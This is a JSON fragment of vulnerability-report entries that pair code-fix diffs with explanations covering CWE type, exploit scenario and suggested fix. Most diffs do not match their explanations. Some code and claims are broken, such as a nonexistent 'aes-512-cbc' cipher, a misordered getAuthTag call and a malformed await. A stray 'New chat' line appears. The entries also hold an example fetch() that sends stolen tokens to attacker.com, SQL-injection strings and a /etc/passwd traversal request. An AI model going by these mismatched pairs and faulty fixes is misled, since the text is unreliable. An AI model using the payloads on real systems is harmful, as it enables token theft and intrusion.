        "explanation": "POC: Insecure Temporary File Handling\nSteps to Reproduce\nClone the repository:\n\ngit clone https://github.com/cake-tools/ClickExportTool.git\n\ncd ClickExportTool\nConfigure the application as per the README.md, including populating settings.py.\n\nRun the vulnerable script:\n\npython task_runner.py\n\nObserve that temporary files (temp.csv) are created in the working directory with predictable names and insecure permissions.\n\nRoot Cause Analysis\nThe application creates temporary files in an insecure manner, leading to multiple security risks:\n\nPredictable Filenames (temp.csv):\nAn attacker can guess the filename and pre-create or overwrite it with malicious content.\nThis can lead to data corruption, code injection, or privilege escalation if the file is later processed with higher permissions.\nWorld-Writable Directory (Default Working Dir):\nSince the file is created in the current working directory (often /tmp or the project root), other users or processes may read, modify, or delete it.\n\nNo File Permissions Restriction:\nThe file is created with default permissions (typically rw-rw-r--), allowing other users on the system to read or modify it.\n\nVulnerable Code\n\nwith open('temp.csv', 'wb') as text_file:  # Predictable name, insecure location\n    writer = csv.writer(text_file)\n\nExploit Scenarios\nRace Condition Attack:\nAn attacker replaces temp.csv with a symlink to a critical system file (/etc/passwd).\nWhen the script writes data, it corrupts system files instead.\nData Theft or Tampering:\nA malicious user reads temp.csv to steal sensitive exported data.\nAlternatively, they modify the file before the script reads it back, leading to data integrity issues.\n\nDenial of Service (DoS):\nAn attacker pre-creates temp.csv as a directory, causing the script to crash when trying to write.\n\nWhy This Happens\nLack of Secure Temp File APIs: The code manually creates files instead of using tempfile.\nNo Randomization: Fixed filenames (temp.csv) make attacks trivial.\nNo Permission Hardening: Files inherit unsafe default permissions.\n\nSecurity Implications\nExploitation can lead to:\n1. Data Corruption (Malicious file overwrites)\n2. Information Disclosure (Unauthorized file reads)\n3. Privilege Escalation (If script runs as root)\n4. Denial of Service (Crash via invalid file handling)\n5. Arbitrary File Overwrite (Symlink attacks)\n\nSuggested Fix\nUse Python\u2019s built-in tempfile module for secure handling:\n\n\nimport tempfile\n\n# Creates a uniquely named temp file, readable only by the owner\nwith tempfile.NamedTemporaryFile(\n    mode='wb', \n    prefix='clickexport_',  # Custom prefix for debugging\n    suffix='.csv', \n    delete=False  # Optional: Keep file after close\n) as text_file:\n    writer = csv.writer(text_file)\n    temp_path = text_file.name  # Store path if needed later\n\nAdditional Hardening Steps\nRestrict Permissions:\n\nos.chmod(temp_path, 0o600)  # Only owner can read/write\n\nClean Up Securely:\nos.unlink(temp_path)  # Delete when done\n\nUse TMPDIR Environment Variable (For custom secure temp locations)."
    },
    "37": {
        "diff": "diff --git a/assistant.py b/assistant.py\nindex 1234567..89abcd0 100644\n--- a/assistant.py\n+++ b/assistant.py\n@@\n-import os\n+import os\n+from pathlib import Path\n+\n+# Only allow music files under the user's Music folder\n+MUSIC_DIR = Path(\"~/Music\").expanduser().resolve()\n@@ def play_music(song_name=None) -> None:\n-        song = random.choice(songs)\n-        os.startfile(os.path.join(song_dir, song))\n-        speak(f\"Playing {song}.\")\n+        song = random.choice(songs)\n+        song_path = Path(song_dir) / song\n+\n+        # Prevent path traversal: ensure file is inside MUSIC_DIR\n+        try:\n+            resolved = song_path.resolve()\n+        except Exception:\n+            raise ValueError(\"Invalid path\")\n+\n+        if not resolved.is_relative_to(MUSIC_DIR):\n+            raise ValueError(\"Access denied\")\n+\n+        os.startfile(str(resolved))\n+        speak(f\"Playing {song}.\")\n@@ def play_music(song_name=None) -> None:\n-    else:\n-        speak(\"No song found.\")\n-        print(\"No song found.\")\n+    else:\n+        speak(\"No song found.\")\n+        print(\"No song found.\")\n",
        "explanation": "Vulnerability Type:\nCWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\n\nProof of Concept:\nresponse.set_cookie(\n    key=\"access_token_cookie\",\n    value=access_token,\n    httponly=False,  # <-- Vulnerable setting\n    domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n    expires=int(timedelta(hours=8).total_seconds()),\n)\n\u2022\tThis line sets a sensitive cookie (access_token_cookie) containing a JWT access token.\n\u2022\tThe httponly=False flag allows JavaScript on the page to access the token.\n\u2022\tThis exposes the cookie to client-side scripts, making it vulnerable to theft via XSS attacks.\n\nSeverity:\nVery Low to low\u2013 Sensitive tokens can be stolen, leading to full account compromise.\n\nRoot Cause:\nThe httponly attribute is explicitly set to False, which allows the access token stored in the cookie to be read by JavaScript running in the browser. This undermines one of the core protections against cross-site scripting (XSS) attacks.\n\nExploit Scenario:\nAn attacker finds a reflected or stored XSS vulnerability in the application or an adjacent domain. They inject JavaScript that reads document.cookie, steals the access_token_cookie, and sends it to a malicious server, gaining unauthorized access to the user account.\n\nWhy It Happens:\nThe cookie containing the JWT access token is not flagged as HttpOnly, which allows any client-side script to read its value. This breaks secure authentication practices by exposing tokens to the client environment.\n\nSecurity Implications:\nIf an attacker steals the access token using XSS, they can impersonate the user and access protected resources without needing credentials. This compromises the confidentiality, integrity, and availability of the user's session and sensitive data.\n\nSuggested Fix:\n@@ def refresh(response: Response, Authorize: AuthJWT = Depends()):\n-    response.set_cookie(\n-        key=\"access_token_cookie\",\n-        value=new_access_token,\n-        httponly=False,\n-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n-        expires=int(timedelta(hours=8).total_seconds()),\n-    )\n+    response.set_cookie(\n+        key=\"access_token_cookie\",\n+        value=new_access_token,\n+        httponly=True,\n+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n+        expires=int(timedelta(hours=8).total_seconds()),\n+    )\n\n@@ async def login(...):\n-    response.set_cookie(\n-        key=\"access_token_cookie\",\n-        value=access_token,\n-        httponly=False,\n-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n-        expires=int(timedelta(hours=8).total_seconds()),\n-    )\n+    response.set_cookie(\n+        key=\"access_token_cookie\",\n+        value=access_token,\n+        httponly=True,\n+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n+        expires=int(timedelta(hours=8).total_seconds()),\n+    )\n\n@@ async def third_party_login(...):\n-    response.set_cookie(\n-        key=\"access_token_cookie\",\n-        value=access_token,\n-        httponly=False,\n-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n-        expires=int(timedelta(hours=8).total_seconds()),\n-    )\n+    response.set_cookie(\n+        key=\"access_token_cookie\",\n+        value=access_token,\n+        httponly=True,\n+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n+        expires=int(timedelta(hours=8).total_seconds()),\n+    )\n"
    },
    "30": {
        "diff": "diff --git a/example.js b/example.js\nindex abcdef1..1234567 100644\n--- a/example.js\n+++ b/example.js\n@@\n-const lib = ffi.Library(null, {\n-    'atoi': ['int', ['string']]\n-});\n+const ref = require('ref-napi');\n+const ffi = require('ffi-napi');\n+\n+global.gc && global.gc(); // force GC before test\n+\n+const lib = ffi.Library(null, {\n+    'atoi': ['int', ['string']]\n+});\n+\n+setInterval(() => {\n+    lib.atoi(\"42\");\n+    global.gc && global.gc(); // explicit cleanup\n+}, 100);\n",
        "explanation": "Vulnerability Type:\nCWE-20: Improper Input Validation\nProof of Concept:\nconst sanitizedEmail = (email as string).toLowerCase();\n\u2022\tThe email variable is extracted from req.query.\n\u2022\tThe code forcibly casts email to a string using (email as string) without validating the actual runtime type.\n\u2022\tIf an attacker supplies an array instead of a string (e.g., ?email[]=attacker@example.com), TypeScript\u2019s type assertion won\u2019t prevent it, and the call to .toLowerCase() will result in a TypeError.\nExample Attack:\nGET /api/verify?email[]=attacker@example.com&email[]=victim@example.com\nResults in:\nTypeError: [\"attacker@example.com\", \"victim@example.com\"].toLowerCase is not a function\nSeverity:\nLow \u2013 but can have severe consequences, potentially leading to a range of vulnerabilities, including denial of service (DoS), arbitrary code execution, and data breaches\nRoot Cause:\nThe vulnerability is caused by the misuse of TypeScript's type assertion, which does not perform actual runtime validation. The code trusts the input type blindly and assumes email is a string without checking, leading to potential runtime exceptions.\n\nExploit Scenario:\nAn attacker can exploit this by sending a query with email[] instead of a string. Express will parse it into an array, and when .toLowerCase() is called on that array, the server throws a TypeError. This can cause application crashes or interfere with email validation and login flows.\nRequest:\nhttp\nCopyEdit\nGET /api/verify?email[]=a@example.com&email[]=b@example.com\nParsed by Express:\njs\nCopyEdit\n{ email: [\"a@example.com\", \"b@example.com\"] }\nWhat Happens:\nts\nCopyEdit\n([\"a@example.com\", \"b@example.com\"] as string).toLowerCase()\n// TypeError: .toLowerCase is not a function\nResult: Server crashes or internal error is thrown.\n\nWhy It Happens:\nThis issue arises because of the assumption that query parameters like email are always strings. The developer casts the value without checking if it\u2019s truly a string at runtime. Since query parameters can be arrays (via repeated keys), this creates a type mismatch.\n\nSecurity Implications:\nIf exploited, this vulnerability could crash the API handler, cause denial-of-service (DoS), or interfere with the login process. It may also expose other logic flaws depending on how invalid email inputs are handled downstream.\n\nSuggested Fix:\n--- a/pages/api/verify/index.ts\n+++ b/pages/api/verify/index.ts\n@@\n-    const { email } = req.query;\n-    if (!email) {\n-        return;\n-    }\n-    const code = generateUniquePasscode();\n-    const sanitizedEmail = (email as string).toLowerCase();\n+    const { email } = req.query;\n+    if (typeof email !== \"string\") {\n+        return res.status(400).json({ message: \"Invalid email format\" });\n+    }\n+    const code = generateUniquePasscode();\n+    const sanitizedEmail = email.toLowerCase();\n"
    },
    "39": {
        "diff": "diff --git a/routes/user.js b/routes/user.js\nindex 1234567..abcdefg 100644\n--- a/routes/user.js\n+++ b/routes/user.js\n@@ -13,6 +13,8 @@ const excel = require(\"./excel\")\n const mime = require('mime')\n \n //The route to get all the user in the datadase\n+const monthNames = [\"january\", \"february\", \"march\", \"april\", \"may\", \"june\",\n+  \"july\", \"august\", \"september\", \"october\", \"november\", \"december\"];\n router.get(\"/\", auth,async (req, res) => {\n try {\n const users = await User.find().select('-attendance');\n@@ -145,19 +147,49 @@ router.get('/getAttandanceJson',auth,async(req,res)=>{\n \n //to get all the attendance in excel format\n router.get('/getallattendance', auth,async (req,res)=>{\n+const {month,year,date,serviceType} = req.query;\n+\n+// Validate input parameters\n+if (!month || !year || !date || !serviceType) {\n+  return res.status(400).send('Missing required parameters');\n+}\n+\n+// Validate month format\n+if (!monthNames.includes(month.toLowerCase())) {\n+  return res.status(400).send('Invalid month parameter');\n+}\n+\n+// Validate year format\n+const currentYear = new Date().getFullYear();\n+if (isNaN(year) || year < 2000 || year > currentYear + 1) {\n+  return res.status(400).send('Invalid year parameter');\n+}\n+\n+// Validate date format\n+if (isNaN(date) || date < 1 || date > 31) {\n+  return res.status(400).send('Invalid date parameter');\n+}\n+\n+// Sanitize serviceType parameter\n+const sanitizedServiceType = serviceType.replace(/[^a-zA-Z0-9-_]/g, '');\n+if (!sanitizedServiceType) {\n+  return res.status(400).send('Invalid serviceType parameter');\n+}\n+\n+const sanitizedMonth = month.toLowerCase();\n+const numericYear = Number(year);\n+const numericDate = Number(date);\n+\n try {\n-//the following are required to get the attendance\n-let {month,year,date,serviceType} = req.query\n-year = Number(year)\n-date = Number(date)\n-const totalAttendance = await User.find({attendance:{ $elemMatch:{month:month.toLowerCase(),date:date,year:year,serviceType:serviceType}}}).select(\"-attendance -_id -__v\")\n+const totalAttendance = await User.find({\n+  attendance: { \n+    $elemMatch: {\n+      month: sanitizedMonth,\n+      date: numericDate,\n+      year: numericYear,\n+      serviceType: sanitizedServiceType\n+    }\n+  }\n+}).select(\"-attendance -_id -__v\")\n var attendance = JSON.stringify(totalAttendance)\n attendance = JSON.parse(attendance)\n console.log(attendance)\n@@ -165,9 +197,9 @@ if(!totalAttendance){\n return res.send(`no attendance:${date},${month},${year}`)\n }\n // The path function to change json into an excel format\n-excel(attendance,date,month,year,serviceType)\n+excel(attendance,numericDate,sanitizedMonth,numericYear,sanitizedServiceType)\n // the path to download the excel file\n-const file = path.join(__dirname,`attendance ${serviceType} (${date}-${month}-${year}).xlsx`)\n+const file = path.join(__dirname,`attendance ${sanitizedServiceType}_${numericDate}_${sanitizedMonth}_${numericYear}.xlsx`)\n const fileName = path.basename(file)\n const mimeType = mime.getType(file)\n // setheader to be able to download attendance",
        "explanation": "Root Cause:\nThe /getallattendance endpoint generates and serves Excel files dynamically without rate-limiting. File system operations (excel file creation) are resource-intensive, and unrestricted access allows repeated requests to overload the server.\n\nExploit Scenario:\nAn attacker could automate rapid requests to /getallattendance, forcing the server to generate multiple large Excel files simultaneously. This would exhaust CPU/memory resources, causing denial-of-service for legitimate users.\n\nWhy It Happens:\nThe endpoint lacks safeguards to limit request frequency. Attackers can trigger expensive operations (file generation, database queries) repeatedly without throttling, exploiting the absence of rate-limiting controls.\n\nSecurity Implications:\nUnlimited access enables DoS attacks, degrading server performance or crashing it entirely. This disrupts service availability, impacts user trust, and may incur financial costs from infrastructure overuse.\n\nSuggested Fix:\nImplement rate-limiting using middleware like express-rate-limit to restrict requests per IP (e.g., 5 requests/minute). Cache generated files temporarily to avoid redundant operations and reduce disk I/O overhead.\nNew chat\n"
    },
    "96": {
        "diff": "diff --git a/reflex/components/forms.py b/reflex/components/forms.py\n--- a/reflex/components/forms.py\n+++ b/reflex/components/forms.py\n@@ -187,7 +187,7 @@\n         # Render the form hooks and use the hash of the resulting code to create a unique name.\n         props[\"handle_submit_unique_name\"] = \"\"\n         form = super().create(*children, **props)\n-        form.handle_submit_unique_name = md5(\n+        form.handle_submit_unique_name = hashlib.sha256(\n             str(form._get_all_hooks()).encode(\"utf-8\")\n         ).hexdigest()\n         return form",
        "explanation": "Vulnerability Type:\nCWE-327: Use of a Broken or Risky Cryptographic Algorithm\nCWE-780: Use of Cryptographic Algorithm without Integrity Checking\n\nUsing insecure or outdated encryption modes can compromise data confidentiality and integrity. CBC mode without authenticated encryption is vulnerable to padding oracle attacks and does not guarantee data integrity. A stronger mode like AES-GCM must be used to provide authenticated encryption.\n\nProof of Concept:\nIn the provided crypto utility, encryption was implemented using:\n\nhttps://github.com/KOSASIH/PiFinance-Core/blob/main/src/utils/cryptoUtils.js\n\nLine 34: crypto.createCipheriv('aes-512-cbc', ...)\nCBC (Cipher Block Chaining) mode alone does not verify that ciphertext was not modified during transit. Attackers could tamper with encrypted data without detection, causing unpredictable behavior or leaks during decryption.\n\nThus, encryption lacked authentication.\n\nSeverity: CRITICAL (4)\n\nThe use of insecure cryptographic modes can allow attackers to decrypt, manipulate, or tamper with confidential data without detection. Given that the utilities are for sensitive information (e.g., banking, digital signatures), any cryptographic weakness must be treated as a high-priority security risk.\n\nRoot Cause:\nThe root cause was selecting an encryption algorithm (AES-512-CBC) that lacks built-in integrity verification. CBC requires separate mechanisms (like HMAC) to ensure authentication, which were missing. Without such protections, data tampering remains undetectable and exploitable by attackers.\n\nExploit Scenario:\nAn attacker intercepts encrypted traffic between a server and a client. Without authentication, the attacker modifies the encrypted payload and sends it forward. Upon decryption, the server either leaks information through error responses or silently processes corrupted, attacker-controlled data.\n\nThis can lead to privilege escalation, information leaks, or full compromise.\n\nWhy It Happens:\nIt happens because CBC mode encrypts blocks sequentially but does not protect the ciphertext\u2019s integrity. Without an accompanying authentication mechanism (like HMAC or GCM mode\u2019s authTag), there\u2019s no verification whether the ciphertext was altered. As a result, modified ciphertexts are processed, causing critical vulnerabilities.\n\nSecurity Implications:\nSuccessful exploitation can result in:\n\nConfidential data being leaked or manipulated.\n\nForged messages being accepted as genuine.\n\nExploitation of cryptographic operations for padding oracle attacks.\n\nFull compromise of cryptographic trust, leading to further system breaches.\n\nSuggested Fix:\nUse AES-256-GCM for encryption instead of AES-512-CBC. GCM (Galois/Counter Mode) provides both encryption and built-in integrity protection using an authentication tag.\n\nCorrect approach:\n\nconst cipher = crypto.createCipheriv('aes-256-gcm', key, iv);\nconst authTag = cipher.getAuthTag();\nAlways store and verify the authentication tag during decryption to ensure data authenticity and confidentiality."
    },
    "91": {
        "diff": "diff --git a/reflex/state.py b/reflex/state.py\nindex 1a2b3c4..d3f4a5e 100644\n--- a/reflex/state.py\n+++ b/reflex/state.py\n@@ -123,7 +123,7 @@ class StateManager:\n         \"\"\"\n         if serialized_state is None:\n             return cls()\n-        return pickle.loads(serialized_state)\n+        return json.loads(serialized_state)\n \n     async def get_state(self, token: str) -> BaseState:\n         \"\"\"Get the state for a token.\n@@ -135,7 +135,7 @@ class StateManager:\n             The state for the token.\n         \"\"\"\n         # Get the serialized state from storage.\n-        serialized_state = await self._get(token)\n+        serialized_state = await self._get(token).encode('utf-8')\n         if serialized_state is None:\n             return self.state().reset()\n         return self._deserialize_state(serialized_state)",
        "explanation": "Vulnerability Type:\nCWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n\nProof of Concept:\nThe Retriever class constructs SQL queries using .format() directly from user input, like:\n\n\nsql_str = \"SELECT * FROM venues WHERE food LIKE '%{0}%'\".format(requested_food)\nThis is dangerous because an attacker could inject malicious SQL code inside requested_food, allowing unauthorized query manipulation or data leakage.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe application uses string formatting methods (.format()) to directly insert user-controlled values into SQL queries.\nThis fails to separate user input from SQL code, making it vulnerable to SQL Injection attacks where malicious users can alter queries by injecting special characters.\n\nExploit Scenario:\nAn attacker provides a requested_food input such as:\n\n%' OR '1'='1\nThe SQL query becomes:\n\n\nSELECT * FROM venues WHERE food LIKE '%%' OR '1'='1%'\nThus, the WHERE condition always evaluates to true, leaking all venue records or potentially allowing database tampering.\n\nWhy It Happens:\nIt happens because the code does not parameterize SQL queries properly.\nBy combining user data and SQL structure using formatting methods, the boundary between trusted SQL code and untrusted input gets blurred, creating a classic injection vulnerability.\n\nSecurity Implications:\nIf exploited, this vulnerability can lead to:\n\nUnauthorized access to database records.\n\nInformation disclosure.\n\nData corruption, manipulation, or deletion.\n\nPossible elevation of privileges depending on the database configuration.\n\nSuggested Fix:\nReplace all formatted queries with parameterized queries using ? placeholders.\nValues should be passed separately from the query text in the execute() method:\n\nquery = \"SELECT * FROM venues WHERE food LIKE ?\"\ncursor.execute(query, (\"%input_value%\",))\nThis ensures SQL commands and user input are strictly separated, preventing injections."
    },
    "53": {
        "diff": "diff --git a/LMSCode.cpp b/LMSCode.cpp\nindex abc1234..def5678 100644\n--- a/LMSCode.cpp\n+++ b/LMSCode.cpp\n@@ -1,24 +1,25 @@\n-#include <iostream.h>\n-#include<conio.h>\n-#include<iomanip.h>//input-output manipulator\n-#include<stdlib.h> \n-#include<string.h>\n-#include<stdio.h>\n-#include<fstream.h>\n+#include <iostream>\n+#include <iomanip>\n+#include <cstdlib> \n+#include <cstring>\n+#include <cstdio>\n+#include <fstream>\n+#include <limits>\n+using namespace std;\n+\n class book\n {\n \tchar bno[6];//bookno.\n \tchar bname[50];//bookname\n \tchar aname[20];//authorname\n \tpublic:\n \tvoid createbook()\n \t{\n \t\tcout<<\"\\nNEW BOOK ENTRY...\\n\";\n \t\tcout<<\"\\nENTER BOOK NO.\";\n-\t\tcin>>bno;\n+\t\tcin>>setw(6)>>bno;\n+\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n \t\tcout<<\"\\nENTER BOOK NAME\";\n-\t\tgets(bname);//enables enter with space\n+\t\tcin.getline(bname, 50);\n \t\tcout<<\"\\nENTER AUTHOR NAME\";\n-\t\tgets(aname);\n+\t\tcin.getline(aname, 20);\n \t\tcout<<\"\\n\\n\\nBook Created..\";\n \t}\n \tvoid showbook()\n@@ -57,9 +58,10 @@\n \t\tclrscr();\n \t\tcout<<\"\\nNEW STUDENT ENTRY...\\n\";\n \t\tcout<<\"\\nEnter The Admission No. \";\n-\t\tcin>>admno;\n+\t\tcin>>setw(6)>>admno;\n+\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n \t\tcout<<\"Enter The Student Name \";\n-\t\tgets(name);\n+\t\tcin.getline(name, 20);\n \t\ttoken=0;\n \t\tstbno[0]='\\0';\n \t\tcout<<\"\\n\\nStudent Record Created...\";\n@@ -77,7 +79,7 @@\n \t{\n \t\tcout<<\"\\nAdmission No. \"<<admno;\n \t\tcout<<\"\\nModify Student Name : \";\n-\t\tgets(name);\n+\t\tcin.getline(name, 20);\n \t}\n \tchar* retadmno()\n \t{\n@@ -418,7 +420,6 @@\n  gotoxy(35,17);\n  cout<<\"SYSTEM\";\n  cout<<\" \\n  by: Chahat\"; \n- getch();\n }\n void adminmenu()\n {\n@@ -482,7 +483,7 @@\n \tcout<<\"\\n\\n\\n\\t3 ADMINISTRATOR MENU\"; \n \tcout<<\"\\n\\n\\n\\t4 EXIT\";\n \tcout<<\"\\n\\n\\n\\t PLEASE SELECT YOUR OPTION(1-4)\";  \n-\tch=getche();\n+\tcin>>ch;\n \tswitch(ch)\n \t{ case '1': bookissue(); \n \t  break;",
        "explanation": "Vulnerability Type: CWE-285: Improper Authorization\nProof of Concept:\nRadio.once('Confirm', 'auth', function() {\n    Radio.request('encrypt', 'delete:secureKey');\n    window.location.reload();\n});\n1. The code listens for the `Confirm:auth` event on the global `Radio` event bus.\n2. When triggered, it deletes the secureKey and reloads the page.\n3. No authentication check is performed before executing this critical operation.\n4. Any script in the application (including malicious ones) can trigger this event:\n   Radio.trigger('Confirm', 'auth');\nSeverity:  4 \u2013 High\nRoot Cause: The application registers an event listener that performs a critical operation (deletion of encryption key material) without verifying whether the caller is authorized. This leaves key lifecycle control exposed to untrusted scripts running in the same runtime.\nExploit Scenario: A malicious plugin or injected script (via stored XSS or developer tool manipulation) calls `Radio.trigger('Confirm', 'auth')`, which causes the user\u2019s encryption key to be deleted and the page to reload. This disrupts encrypted session functionality and can lead to user confusion or DoS conditions.\n Why It Happens: The event hook relies on a global message bus and assumes that only legitimate, internal UI actions will trigger the event. However, since `Radio` is globally accessible in the app, it introduces a security-critical design flaw by allowing unauthenticated triggers.\nSecurity Implications: An attacker with any access to frontend JS context can forcibly delete secure session keys, causing encrypted notes to become temporarily inaccessible. It opens the door to denial-of-service attacks or social engineering loops (forcing users to re-authenticate repeatedly).\nSuggested Fix: Add an authentication check inside the event handler using `Radio.request('encrypt', 'check:auth')` to verify that the user is authorized before deleting the secure key. This ensures that only authenticated actions can trigger sensitive state changes."
    },
    "7": {
        "diff": "--- a/RegisterController.php\n+++ b/RegisterController.php\n@@ public function register(Request $request)\n {\n-    $this->validator($request->all())->validate();\n-    event(new Registered($user = $this->create($request->all())));\n-    $user->role()->sync([3]);\n-    $this->guard()->login($user);\n-    return $this->registered($request, $user)\n-        ?: redirect($request->input('redirect_url'));\n+    $this->validator($request->all())->validate();\n+\n+    event(new Registered($user = $this->create($request->all())));\n+\n+    $user->role()->sync([3]);\n+\n+    $this->guard()->login($user);\n+\n+    $redirectUrl = $request->input('redirect_url', $this->redirectTo);\n+\n+    // Only allow internal redirects\n+    if (!preg_match('/^\\/[a-zA-Z0-9\\/\\-_]*$/', $redirectUrl)) {\n+        $redirectUrl = $this->redirectTo; // fallback to default\n+    }\n+\n+    return $this->registered($request, $user) ?: redirect($redirectUrl);\n }\n\n\n",
        "explanation": "Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n\nOWASP Top 10: A1:2021 - Broken Access Control\n\nSeverity: High (4)\n\nRoot Cause: The server uses user-supplied input directly in file paths without validating or sanitizing the input, allowing directory traversal.\n\nExploit Scenario: An attacker sends a GET request to /get-project-files?project-name=../../../../etc/passwd to retrieve sensitive files outside the intended directory.\n\nWhy It Happens: The application constructs file paths using unvalidated input, enabling traversal outside the target directory via '../' sequences.\n\nSecurity Implications: Allows arbitrary file read, potentially exposing server secrets, credentials, or user data. May lead to full system compromise.\n\nSuggested Fix: Use path.basename to strip directory traversal sequences and restrict access to a specific folder (e.g., 'projects')."
    },
    "98": {
        "diff": "import tempfile\nwith tempfile.NamedTemporaryFile(delete=False, mode='wb') as text_file:\n    writer = csv.writer(text_file)",
        "explanation": "Root Cause:\nThe SQL query directly concatenates user inputs (username and password) into the query string without parameterized queries or input sanitization. This exposes the application to SQL injection attacks, allowing attackers to manipulate the SQL statement execution.\n\nVulnerable code:\ncur.execute(\"SELECT * FROM users where username='\" + username + \"' and password='\" + password + \"'\")  # Line 52\n\nExploit Scenario:\nAn attacker could input malicious SQL statements such as ' OR 1=1 -- as the username and any string as the password. This would bypass authentication and grant unauthorized access. Similarly, an attacker could extract sensitive data by injecting UNION queries.\n\nVulnerable code:\ncur.execute(\"SELECT * FROM users where username='\" + username + \"' and password='\" + password + \"'\")  # Line 52\n\nWhy It Happens:\nThe application does not use secure coding practices like parameterized queries or ORM (Object Relational Mapping) frameworks, which prevent direct injection of user inputs into SQL statements.\n\nSecurity Implications:\nExploitation can lead to:\n\nBypassing authentication.\nUnauthorized access to sensitive data.\nData corruption or deletion.\nCompromise of the database server.\n\nSuggested Fix:\nUse parameterized queries instead of string concatenation to prevent SQL injection\ncur.execute(\"SELECT * FROM users WHERE username = %s AND password = %s\", (username, password))\n\nConsider implementing an ORM (Object-Relational Mapping) framework which handles parameter sanitization automatically.\nApply input validation to ensure that username and password fields contain only expected characters and formats before processing.\nLimit database user privileges to only what's necessary for the application to function properly, reducing the potential impact of successful SQL injection attacks."
    },
    "54": {
        "diff": "diff --git a/laverna/apps/scripts/apps/encryption/appEncrypt.js b/laverna/apps/scripts/apps/encryption/appEncrypt.js\nindex 66a7f2a..9c3bf91 100644\n--- a/laverna/apps/scripts/apps/encryption/appEncrypt.js\n+++ b/laverna/apps/scripts/apps/encryption/appEncrypt.js\n@@\n Radio.once('Confirm', 'auth', function() {\n-    Radio.request('encrypt', 'delete:secureKey');\n-    window.location.reload();\n+    const isAuthed = Radio.request('encrypt', 'check:auth');\n+    if (isAuthed === true) {\n+        Radio.request('encrypt', 'delete:secureKey');\n+        window.location.reload();\n+    } else {\n+        console.warn('[SECURITY] Unauthorized key deletion attempt');\n+    }\n });\n",
        "explanation": "This vulnerability occurs because sensitive authentication tokens (JWT) are stored in localStorage, which is accessible from any JavaScript running in the browser.\nThe root cause is insecure client-side storage of tokens without mitigating XSS risks.\nIf an attacker injects malicious JavaScript via an XSS vulnerability on any page, they can steal the token and impersonate the user.\nThis can lead to full account takeover, privilege escalation, or data exposure.\n\n\nVulnerability Location:\nThe JWT token is stored in localStorage:\n\nLine 41: localStorage.setItem(\"token\", state.token);\n\nThis is security-sensitive logic, and it's relevant across:\n\nhttps://github.com/ilhamclive/doctor-appointment-frontend/blob/master/src/context/AuthContext.jsx\n\nAny component that consumes token from localStorage\nPotentially exposed pages via XSS\n\n\nShort Description of the Vulnerability Cause:\nThe vulnerability arises from storing sensitive authentication data (specifically the JWT token and user details) directly in the browser\u2019s localStorage within the AuthContext logic:\n\nLine 40: localStorage.setItem(\"token\", state.token);\nLine 41: localStorage.setItem(\"user\", JSON.stringify(state.user));\n\nThis exposes the token to any JavaScript running on the page. If an attacker is able to inject malicious scripts through a Cross-Site Scripting (XSS) vulnerability anywhere in the application, they can access localStorage and steal the token. This compromises the user\u2019s session and can lead to account takeover, especially if the token is long-lived or grants admin-level access.\n\n\nProof of Concept: \nShort Description of How an Attacker Could Exploit the Vulnerability\nAn attacker could exploit this vulnerability by injecting malicious JavaScript into a page via a Cross-Site Scripting (XSS) vector\u2014such as an unsanitized input field, comment box, or a URL parameter that reflects into the DOM. Once the script runs in the victim's browser, it can access the localStorage and exfiltrate the stored JWT token and user information like this:\n\nfetch(\"https://attacker.com/steal\", {\n  method: \"POST\",\n  body: JSON.stringify({\n    token: localStorage.getItem(\"token\"),\n    user: localStorage.getItem(\"user\")\n  })\n});\n Short Description of the Potential Consequences if Exploited:\nIf this vulnerability is exploited, an attacker can steal a user's JWT token and impersonate them across the application without needing their credentials. This can lead to account takeover, allowing the attacker to view sensitive personal data, perform unauthorized actions on behalf of the user, or escalate privileges if the stolen token belongs to an admin.\n\n\nSuggested Fix:\nTo resolve this vulnerability, avoid storing authentication tokens in localStorage, as it is accessible to any script running in the browser and vulnerable to XSS-based token theft. Instead, use HttpOnly, Secure cookies to store JWT tokens\u2014these cookies are inaccessible to JavaScript and automatically included in requests to the server"
    },
    "38": {
        "diff": "@@ def refresh(response: Response, Authorize: AuthJWT = Depends()):\n-    response.set_cookie(\n-        key=\"access_token_cookie\",\n-        value=new_access_token,\n-        httponly=False,\n-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n-        expires=int(timedelta(hours=8).total_seconds()),\n-    )\n+    response.set_cookie(\n+        key=\"access_token_cookie\",\n+        value=new_access_token,\n+        httponly=True,\n+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n+        expires=int(timedelta(hours=8).total_seconds()),\n+    )\n\n@@ async def login(...):\n-    response.set_cookie(\n-        key=\"access_token_cookie\",\n-        value=access_token,\n-        httponly=False,\n-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n-        expires=int(timedelta(hours=8).total_seconds()),\n-    )\n+    response.set_cookie(\n+        key=\"access_token_cookie\",\n+        value=access_token,\n+        httponly=True,\n+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n+        expires=int(timedelta(hours=8).total_seconds()),\n+    )\n\n@@ async def third_party_login(...):\n-    response.set_cookie(\n-        key=\"access_token_cookie\",\n-        value=access_token,\n-        httponly=False,\n-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n-        expires=int(timedelta(hours=8).total_seconds()),\n-    )\n+    response.set_cookie(\n+        key=\"access_token_cookie\",\n+        value=access_token,\n+        httponly=True,\n+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,\n+        expires=int(timedelta(hours=8).total_seconds()),\n+    )\n",
